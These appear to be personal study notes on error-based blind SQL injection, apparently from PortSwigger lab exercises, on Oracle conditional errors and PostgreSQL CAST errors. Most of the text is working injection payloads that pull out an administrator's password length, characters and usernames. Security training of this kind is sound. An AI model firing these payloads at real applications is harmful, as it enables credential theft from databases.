use error messages to either extract or infer sensitive data from the database.

### exploit by triggering conditional errors

the result of SQL queries won't change the app's behavior. so injecting boolean
conditions doesn't change the app's responses.

modify the query to cause a database error, infer stuff depending on whether a SQL error occurs.


1. `xyz' AND (SELECT CASE WHEN (1=2) THEN ELSE 'a' END)='a`

`CASE` evaluates to `a`, no error.

2.
`xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`
`xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`

evaluates to `a`, doesn't cause an error.
evaluates to `1/0` , which causes a divide-by-zero error.

then you will look for a difference in the application's response.

3. `lzjS7' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL) = 'a'--`

* `TO_CHAR` makes both branch conditions the same.
* `END FROM dual` is also necessary in oracle
    * `DUAL` is a sort of dummy table with one row in every oracle db.
    * `END` is the closing part of the condition.


3. check the password length.

`' AND (SELECT CASE WHEN LENGTH(password) > 10 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--`


notice that the error means the condition is true. you can change it too.

4. use injected conditions to retrieve data, testing one character at a time:

`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

AND the result of the subquery = 'a'.
subquery: if the first index is greater that 'm'.

5. `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

look into portswiggers for more info.

### Extracting sensitive data via verbose SQL error messages

you may be able to induce the application to generate an error message that
contains some of the data that is returned by the query. This turns an otherwise
blind SQL injection vulnerability into a visible one. 

1. `CAST((SELECT example_column FROM example_table) AS int)`

converts data types, if it's an incompatible type (string -> int) might cause an error, which could be useful to trigger *conditional responses*.

* if there is a *character limitation*, you can't use longer queries.

* the query will be syntactically valid if you don't get errors. perhaps by commenting the rest: `TrackingId=ogAZZfxtOKUELbuJ'--`

test process:

`' AND CAST((SELECT 1) AS INT) --` returns an error, because it expects a boolean (1=1 => true)

`' AND 1=CAST((SELECT 1) AS INT) --` is true, so no errors returned

`' AND 1=CAST((SELECT "abc") AS INT) --` error, returning `"abc"`

`' AND 1=CAST((SELECT username FROM users LIMIT 1) AS INT) --`

remove the cookie because it's not needed and leaves us more characters.

`LIMIT 1`: so that it doesn't show too many rows.

AND we get an error: invalid input syntax for type integer: "administrator"

so we get the idea to : `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT) --`

using this stuff, you can get `version()` and all.

ERROR indicating *character limit*:

```
Unterminated string literal started at position 95 in SQL SELECT * FROM
tracking WHERE id = 'hyPr13PYPcOYmG05' AND CAST((SELECT password FROM users
where'. Expected  char
```
